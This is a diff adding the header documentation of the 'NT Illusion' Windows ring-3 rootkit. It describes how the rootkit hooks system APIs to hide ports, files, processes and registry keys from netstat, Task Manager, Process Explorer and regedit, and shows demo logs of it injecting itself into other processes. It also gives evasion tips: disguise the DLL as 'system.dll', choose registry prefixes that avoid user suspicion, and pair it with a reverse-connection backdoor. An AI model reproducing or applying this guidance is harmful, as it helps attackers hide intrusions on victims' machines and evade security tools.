@@ -1,0 +1,155 @@
+/*	***************************************************************************
+ -----------------------------------------------------------------------------
+	NT ILLUSION ROOTKIT	v 1.0
+	An evil windows XP/NT ring 3 ROOTKIT
+ ------------------------------------------------------------------------------
+	Author   :   Coded by Kdm (kodmaker@syshell.org)
+ ------------------------------------------------------------------------------
+	Site     :   http://www.syshell.org
+ ------------------------------------------------------------------------------
+	Code is copyright Kdm (2002-2003-2004), except explicit mentions.
+ ------------------------------------------------------------------------------
+
+ I/ Features (*) :
+ -------------
+	---------------------------------------------------------------------------
+	o	TCP				- coder -		- hooked api(s) -
+	---------------------------------------------------------------------------
+	- defeats netstat			(windows)		CharToOembufA
+	- defeats aports			(ntutility.com)		AllocAndGetTCPExTableFromStack
+	- defeats fport				(foundstone)		AllocAndGetTCPExTableFromStack
+**	- disables tcpview			(sysinternals)		AllocAndGetTCPExTableFromStack
+									& whole program disabled
+	- defeats any program that rely directly (or by using GetProcAddress) on 
+	  AllocAndGetTCPExTableFromStack
+	---------------------------------------------------------------------------
+	o	FILES
+	---------------------------------------------------------------------------
+	- defeats explorer			(windows)		FindFirst/NextFileA/W
+	- defeats cmd's dir			(windows)		WriteConsoleW(/A)
+	- defeats any program that rely directly (or by using GetProcAddress) on 
+	  FindFirst/NextFileA/W
+	---------------------------------------------------------------------------
+	o	PROCESSES
+	---------------------------------------------------------------------------
+	- defeats taskmanager			(windows)		NtQuerySystemInformation
+	- disables Process Explorer		(sysinternals)		NtQuerySystemInformation
+	- defeats any program that rely directly (or by using GetProcAddress) on 
+	  NtQuerySystemInformation
+	---------------------------------------------------------------------------
+	o	REGISTRY
+	---------------------------------------------------------------------------
+	- defeats regedit			(windows)		RegEnumValue
+	- defeats any program that rely directly (or by using GetProcAddress) on 
+	  RegEnumValue
+	---------------------------------------------------------------------------
+	
+	Notes :
+	-------
+	* Any process whose executable name or command line contains RTK_FILE_CHAR 
+	will not be hijacked (backdoor)
+ II/ Details :
+ -------------
+	<------------->
+	C:\>kNTIllusionLoader.exe kNTIllusion.dll
+	Running NTIllusion Rootkit Loader v 0.1 by Kdm (kodmaker@netcourrier.com)
+
+	OK
+	C:\>
+	Debug View : 
+	- Rootkit injected into 'c:\windows\explorer.exe', fixing modules...
+	...
+	- # Hooked CreateProcessW :  - "C:\aports.exe" , injecting rootkit 
+	  (c:\kntillusion.dll)...
+	- Rootkit injected into 'c:\aports.exe', fixing modules...
+	- Spreading across userland : injected into 'c:\aports.exe', fixing modules...
+	- 'c:\aports.exe' : all modules reviewed.
+	</------------->
+
+
+  	---------------------------------------------------------------------------
+	o TCP
+	---------------------------------------------------------------------------
+	NTIllusion hooks AllocAndGetTCPExTableFromStack to make programs hide some 
+	(strategic ? :]) tcp ports. These "hidden ports" belong to range from 
+	RTK_PORT_HIDE_MIN to RTK_PORT_HIDE_MAX. This is done by hijacking 
+	AllocAndGetTCPExTableFromStack for all programs (NT latests versions) and
+	CharToOembufA (netstat output).
+	= Demo =
+	C:\>nc -lp 56788
+	C:\>netstat -an
+	Debug View : [!] NTIllusion made a port hidden (5678* range)
+	C:\>aports.exe
+	Debug View : [!] NTIllusion made a TCP socket hidden for process nc.exe (1884)
+	---------------------------------------------------------------------------
+
+ 	---------------------------------------------------------------------------
+	o	PROCESS
+	---------------------------------------------------------------------------
+	NTIllusion hooks NtQuerySystemInformation to make programs hide some 
+	(strategic ? :]) process. So all process whose file name starts by 
+	RTK_PROCESS_CHAR will be hidden.
+	= Demo =
+	C:\>_ntibackdoor.exe
+	Debug View : [!] NTIllusion made the process '_ntibackdoor.exe' hidden.
+	Note : the SendMessageW hook for taskmgr.exe is available for test purpose.
+	---------------------------------------------------------------------------
+
+  	---------------------------------------------------------------------------
+	o	FILES
+	---------------------------------------------------------------------------
+	NTIllusion hooks FindFirstFileA/W, FindNextFileA/W to make programs hide 
+	some (strategic ? :]) files. Contrary to the registry hook engine, a hidden
+	file with a prefix that sits in a lower position than an other file's one
+	in ASCII table won't prevent them from being shown. So a hidden file named
+	abcd.exe won't hide bcde.exe and so on. All files whose name start by 
+	RTK_FILE_CHAR will be hidden.
+	= Demo =
+	echo rootkitloaded > c:\_ntimsg.txt
+	C:\>dir c:\*.*
+	Debug View : [!] NTIllusion made the file : '_ntimsg.txt' invisible.
+	Browse to c:\ :
+	Debug View : [!] NTIllusion made the file : '_ntimsg.txt' invisible.
+	---------------------------------------------------------------------------
+
+	---------------------------------------------------------------------------
+	o REGISTRY
+	---------------------------------------------------------------------------
+	NTIllusion hooks regedit to make it hide some (strategic ? :]) registry keys.
+	Regedit won't see all keys starting by string RTK_REG_CHAR (_nti by default).
+	Indeed, we return a value that means the end of the keys list. That's why you
+	must be prudent when choosing RTK_REG_CHAR because a too global prefix will
+	also hide normal keys and may bring the user suspicion.
+	=	Examples =
+	- Bad prefix : using _ char as rootkit's tag could hide other keys whose 
+	first char's ascii code is greater	than _ one, since keys are retrieved in 
+	lexicographic order by default.
+	- Correct prefix : using char © prevent us the effort of returning the next
+	correct key (if it exists) since registry key names are most of the time
+	composed of alphanumeric tokens.
+	= Demo =
+	C:\>regedit.exe
+	Debug View : [!] NTIllusion made the key '_ntiKdm' (and all subsequent keys)
+	hidden.
+	---------------------------------------------------------------------------
+  	 
+ III/ Comments :
+ ---------------
+	- fixed debug output function : rootkit now sends a whole string instead of 
+	  unformatted parts
+	- you can solve self tcp scan (instead of netsat) problem by using a
+	  reverse connection backdoor
+	- beware : dll may be revealed by Sygate personal firewall that contains
+	  a dll injection couterfighting mechanism. So name this dll properly !
+	  (ie not backdoor.dll ... but system.dll) 
+
+ IV/ Todo :
+ ----------
+	- port NT ILLUSION to win 9x (yes, it's possible)
+	- hijack LoadLibraryW & CreateProcessA
+	- code a routine that scans all process from explorer's process and try to
+	  inject them (this will inject console programs launched before the rootkit
+	  is loaded or graphic process not brought to foreground but able to reveal
+	  us: for example, ftp servers)) by using no privilege, then the 
+	  SeDebugPrivilege (if possible)
+ *****************************************************************************/
